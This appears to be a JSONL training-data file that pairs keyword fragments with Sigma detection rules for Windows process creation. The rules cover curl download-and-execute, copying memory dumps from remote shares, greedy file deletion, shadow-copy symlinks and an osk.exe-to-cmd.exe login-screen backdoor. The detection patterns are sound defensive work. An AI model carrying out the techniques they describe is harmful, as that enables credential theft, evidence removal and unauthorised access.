{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe copy \\\\\\\\ .dmp .dump .hdmp", "output": "title: Copy .DMP/.DUMP Files From Remote Share Via Cmd.EXE\nid: 044ba588-dff4-4918-9808-3f95e8160606\nstatus: test\ndescription: Detects usage of the copy builtin cmd command to copy files with the \".dmp\"/\".dump\" extension from a remote share\nreferences:\n    - https://thedfirreport.com/2022/09/26/bumblebee-round-two/\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2022-09-27\nmodified: 2023-09-12\ntags:\n    - attack.credential-access\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example: copy \\\\<host>\\\\<folder>\\\\process.dmp C:\\Users\\process.dmp\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'copy '\n            - ' \\\\\\\\'\n        CommandLine|contains:\n            - '.dmp'\n            - '.dump'\n            - '.hdmp'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-c curl http -o &", "output": "title: Curl Download And Execute Combination\nid: 21dd6d38-2b18-4453-9404-a0fe4a0cc288\nstatus: test\ndescription: Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.\nreferences:\n    - https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983 # Dead Link\nauthor: Sreeman, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-01-13\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -c '\n        CommandLine|contains|all:\n            - 'curl '\n            - 'http'\n            - '-o'\n            - '&'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-c curl http -o &", "output": "title: Curl Download And Execute Combination\nid: 21dd6d38-2b18-4453-9404-a0fe4a0cc288\nstatus: test\ndescription: Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.\nreferences:\n    - https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983 # Dead Link\nauthor: Sreeman, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-01-13\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -c '\n        CommandLine|contains|all:\n            - 'curl '\n            - 'http'\n            - '-o'\n            - '&'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "-c curl http -o &", "output": "title: Curl Download And Execute Combination\nid: 21dd6d38-2b18-4453-9404-a0fe4a0cc288\nstatus: test\ndescription: Adversaries can use curl to download payloads remotely and execute them. Curl is included by default in Windows 10 build 17063 and later.\nreferences:\n    - https://medium.com/@reegun/curl-exe-is-the-new-rundll32-exe-lolbin-3f79c5f35983 # Dead Link\nauthor: Sreeman, Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-01-13\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1218\n    - attack.command-and-control\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -c '\n        CommandLine|contains|all:\n            - 'curl '\n            - 'http'\n            - '-o'\n            - '&'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe del erase -f -s -q", "output": "title: File Deletion Via Del\nid: 379fa130-190e-4c3f-b7bc-6c8e834485f3\nstatus: test\ndescription: |\n    Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains|windash:\n            - ' -f' # Force deleting of read-only files.\n            - ' -s' # Delete specified files from all subdirectories.\n            - ' -q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe del erase -f \\\"-\\\"\\\"s\\\" -q", "output": "title: File Deletion Via Del\nid: 379fa130-190e-4c3f-b7bc-6c8e834485f3\nstatus: test\ndescription: |\n    Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains|windash:\n            - ' -f' # Force deleting of read-only files.\n            - ' -s' # Delete specified files from all subdirectories.\n            - ' -q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd Cmd del erase -f -s -q", "output": "title: File Deletion Via Del\nid: 379fa130-190e-4c3f-b7bc-6c8e834485f3\nstatus: test\ndescription: |\n    Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains|windash:\n            - ' -f' # Force deleting of read-only files.\n            - ' -s' # Delete specified files from all subdirectories.\n            - ' -q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe del erase -f -s -q", "output": "title: File Deletion Via Del\nid: 379fa130-190e-4c3f-b7bc-6c8e834485f3\nstatus: test\ndescription: |\n    Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\n    Adversaries may delete files left behind by the actions of their intrusion activity.\n    Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\n    Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113\ndate: 2022-01-15\nmodified: 2024-03-05\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_flags:\n        CommandLine|contains|windash:\n            - ' -f' # Force deleting of read-only files.\n            - ' -s' # Delete specified files from all subdirectories.\n            - ' -q' # Quiet mode, do not ask if ok to delete on global wildcard\n    condition: all of selection_*\nfalsepositives:\n    - False positives levels will differ Depending on the environment. You can use a combination of ParentImage and other keywords from the CommandLine field to filter legitimate activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe del erase \\\\\\ .au3 \\\\\\ .dll \\\\\\ .exe \\\\\\ .js", "output": "title: Greedy File Deletion Using Del\nid: 204b17ae-4007-471b-917b-b917b315c5db\nstatus: test\ndescription: Detects execution of the \"del\" builtin command to remove files using greedy/wildcard expression. This is often used by malware to delete content of folders that perhaps contains the initial malware infection or to delete evidence.\nreferences:\n    - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113 , X__Junior (Nextron Systems)\ndate: 2021-12-02\nmodified: 2023-09-11\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example:\n    #   del C:\\ProgramData\\*.dll & exit\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_extensions:\n        CommandLine|contains:\n            - '\\\\\\*.au3'\n            - '\\\\\\*.dll'\n            - '\\\\\\*.exe'\n            - '\\\\\\*.js'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe del erase \\\\\\ .au3 \\\\\\ .dll \\\\\\ .exe \\\"\\\\\"\\\"\\\\\"\\\"\\\\\" .js", "output": "title: Greedy File Deletion Using Del\nid: 204b17ae-4007-471b-917b-b917b315c5db\nstatus: test\ndescription: Detects execution of the \"del\" builtin command to remove files using greedy/wildcard expression. This is often used by malware to delete content of folders that perhaps contains the initial malware infection or to delete evidence.\nreferences:\n    - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113 , X__Junior (Nextron Systems)\ndate: 2021-12-02\nmodified: 2023-09-11\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example:\n    #   del C:\\ProgramData\\*.dll & exit\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_extensions:\n        CommandLine|contains:\n            - '\\\\\\*.au3'\n            - '\\\\\\*.dll'\n            - '\\\\\\*.exe'\n            - '\\\\\\*.js'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd Cmd del erase \\\\\\ .au3 \\\\\\ .dll \\\\\\ \\\\\\", "output": "title: Greedy File Deletion Using Del\nid: 204b17ae-4007-471b-917b-b917b315c5db\nstatus: test\ndescription: Detects execution of the \"del\" builtin command to remove files using greedy/wildcard expression. This is often used by malware to delete content of folders that perhaps contains the initial malware infection or to delete evidence.\nreferences:\n    - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113 , X__Junior (Nextron Systems)\ndate: 2021-12-02\nmodified: 2023-09-11\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example:\n    #   del C:\\ProgramData\\*.dll & exit\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_extensions:\n        CommandLine|contains:\n            - '\\\\\\*.au3'\n            - '\\\\\\*.dll'\n            - '\\\\\\*.exe'\n            - '\\\\\\*.js'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe del erase \\\\\\ .au3 \\\\\\ .dll \\\\\\ .exe \\\\\\ .js", "output": "title: Greedy File Deletion Using Del\nid: 204b17ae-4007-471b-917b-b917b315c5db\nstatus: test\ndescription: Detects execution of the \"del\" builtin command to remove files using greedy/wildcard expression. This is often used by malware to delete content of folders that perhaps contains the initial malware infection or to delete evidence.\nreferences:\n    - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase\nauthor: frack113 , X__Junior (Nextron Systems)\ndate: 2021-12-02\nmodified: 2023-09-11\ntags:\n    - attack.defense-evasion\n    - attack.t1070.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    # Example:\n    #   del C:\\ProgramData\\*.dll & exit\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_del:\n        CommandLine|contains:\n            - 'del '\n            - 'erase '\n    selection_extensions:\n        CommandLine|contains:\n            - '\\\\\\*.au3'\n            - '\\\\\\*.dll'\n            - '\\\\\\*.exe'\n            - '\\\\\\*.js'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe dir -s", "output": "title: File And SubFolder Enumeration Via Dir Command\nid: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006\nstatus: test\ndescription: |\n    Detects usage of the \"dir\" command part of Widows CMD with the \"/S\" command line flag in order to enumerate files in a specified directory and all subdirectories.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2024-04-14\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: Cmd.Exe\n    selection_cli:\n        CommandLine|contains|windash: 'dir*-s'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe \\\"Cmd\\\".Exe dir -s", "output": "title: File And SubFolder Enumeration Via Dir Command\nid: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006\nstatus: test\ndescription: |\n    Detects usage of the \"dir\" command part of Widows CMD with the \"/S\" command line flag in order to enumerate files in a specified directory and all subdirectories.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2024-04-14\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: Cmd.Exe\n    selection_cli:\n        CommandLine|contains|windash: 'dir*-s'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd Cmd dir -s", "output": "title: File And SubFolder Enumeration Via Dir Command\nid: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006\nstatus: test\ndescription: |\n    Detects usage of the \"dir\" command part of Widows CMD with the \"/S\" command line flag in order to enumerate files in a specified directory and all subdirectories.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2024-04-14\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: Cmd.Exe\n    selection_cli:\n        CommandLine|contains|windash: 'dir*-s'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe dir -s Cmd.Exe", "output": "title: File And SubFolder Enumeration Via Dir Command\nid: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006\nstatus: test\ndescription: |\n    Detects usage of the \"dir\" command part of Widows CMD with the \"/S\" command line flag in order to enumerate files in a specified directory and all subdirectories.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113\ndate: 2021-12-13\nmodified: 2024-04-14\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: Cmd.Exe\n    selection_cli:\n        CommandLine|contains|windash: 'dir*-s'\n    condition: all of selection_*\nfalsepositives:\n    - Likely\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe http :// %AppData%", "output": "title: Command Line Execution with Suspicious URL and AppData Strings\nid: 1ac8666b-046f-4201-8aba-1951aaec03a3\nstatus: test\ndescription: Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)\nreferences:\n    - https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100\n    - https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019-01-16\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.command-and-control\n    - attack.t1059.003\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains|all:\n            - 'http' # captures both http and https\n            - '://'\n            - '%AppData%'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - High\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe http \\\"://\\\" %AppData%", "output": "title: Command Line Execution with Suspicious URL and AppData Strings\nid: 1ac8666b-046f-4201-8aba-1951aaec03a3\nstatus: test\ndescription: Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)\nreferences:\n    - https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100\n    - https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019-01-16\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.command-and-control\n    - attack.t1059.003\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains|all:\n            - 'http' # captures both http and https\n            - '://'\n            - '%AppData%'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - High\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd http :// %AppData%", "output": "title: Command Line Execution with Suspicious URL and AppData Strings\nid: 1ac8666b-046f-4201-8aba-1951aaec03a3\nstatus: test\ndescription: Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)\nreferences:\n    - https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100\n    - https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019-01-16\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.command-and-control\n    - attack.t1059.003\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains|all:\n            - 'http' # captures both http and https\n            - '://'\n            - '%AppData%'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - High\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe http %AppData% ://", "output": "title: Command Line Execution with Suspicious URL and AppData Strings\nid: 1ac8666b-046f-4201-8aba-1951aaec03a3\nstatus: test\ndescription: Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell)\nreferences:\n    - https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100\n    - https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100\nauthor: Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community\ndate: 2019-01-16\nmodified: 2021-11-27\ntags:\n    - attack.execution\n    - attack.command-and-control\n    - attack.t1059.003\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains|all:\n            - 'http' # captures both http and https\n            - '://'\n            - '%AppData%'\n    condition: selection\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - High\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe mklink \\osk.exe \\cmd.exe", "output": "title: Potential Privilege Escalation Using Symlink Between Osk and Cmd\nid: e9b61244-893f-427c-b287-3e708f321c6b\nstatus: test\ndescription: Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1546.008/T1546.008.md\n    - https://ss64.com/nt/mklink.html\nauthor: frack113\ndate: 2022-12-11\nmodified: 2022-12-20\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.008\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'mklink'\n            - '\\osk.exe'\n            - '\\cmd.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe Cmd.Exe mklink \"\\osk.exe\" \\cmd.exe", "output": "title: Potential Privilege Escalation Using Symlink Between Osk and Cmd\nid: e9b61244-893f-427c-b287-3e708f321c6b\nstatus: test\ndescription: Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1546.008/T1546.008.md\n    - https://ss64.com/nt/mklink.html\nauthor: frack113\ndate: 2022-12-11\nmodified: 2022-12-20\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.008\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'mklink'\n            - '\\osk.exe'\n            - '\\cmd.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd Cmd mklink \\osk \\cmd", "output": "title: Potential Privilege Escalation Using Symlink Between Osk and Cmd\nid: e9b61244-893f-427c-b287-3e708f321c6b\nstatus: test\ndescription: Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1546.008/T1546.008.md\n    - https://ss64.com/nt/mklink.html\nauthor: frack113\ndate: 2022-12-11\nmodified: 2022-12-20\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.008\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'mklink'\n            - '\\osk.exe'\n            - '\\cmd.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\cmd.exe mklink \\cmd.exe Cmd.Exe \\osk.exe", "output": "title: Potential Privilege Escalation Using Symlink Between Osk and Cmd\nid: e9b61244-893f-427c-b287-3e708f321c6b\nstatus: test\ndescription: Detects the creation of a symbolic link between \"cmd.exe\" and the accessibility on-screen keyboard binary (osk.exe) using \"mklink\". This technique provides an elevated command prompt to the user from the login screen without the need to log in.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1546.008/T1546.008.md\n    - https://ss64.com/nt/mklink.html\nauthor: frack113\ndate: 2022-12-11\nmodified: 2022-12-20\ntags:\n    - attack.privilege-escalation\n    - attack.persistence\n    - attack.t1546.008\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\cmd.exe'\n        - OriginalFileName: 'Cmd.Exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'mklink'\n            - '\\osk.exe'\n            - '\\cmd.exe'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "mklink HarddiskVolumeShadowCopy", "output": "title: VolumeShadowCopy Symlink Creation Via Mklink\nid: 40b19fa6-d835-400c-b301-41f3a2baacaf\nstatus: stable\ndescription: Shadow Copies storage symbolic link creation using operating systems utilities\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019-10-22\nmodified: 2023-03-06\ntags:\n    - attack.credential-access\n    - attack.t1003.002\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'mklink'\n            - 'HarddiskVolumeShadowCopy'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "mklink \"HarddiskVolumeShadowCopy\"", "output": "title: VolumeShadowCopy Symlink Creation Via Mklink\nid: 40b19fa6-d835-400c-b301-41f3a2baacaf\nstatus: stable\ndescription: Shadow Copies storage symbolic link creation using operating systems utilities\nreferences:\n    - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nauthor: Teymur Kheirkhabarov, oscd.community\ndate: 2019-10-22\nmodified: 2023-03-06\ntags:\n    - attack.credential-access\n    - attack.t1003.002\n    - attack.t1003.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'mklink'\n            - 'HarddiskVolumeShadowCopy'\n    condition: selection\nfalsepositives:\n    - Legitimate administrator working with shadow copies, access for backup purposes\nlevel: high"}
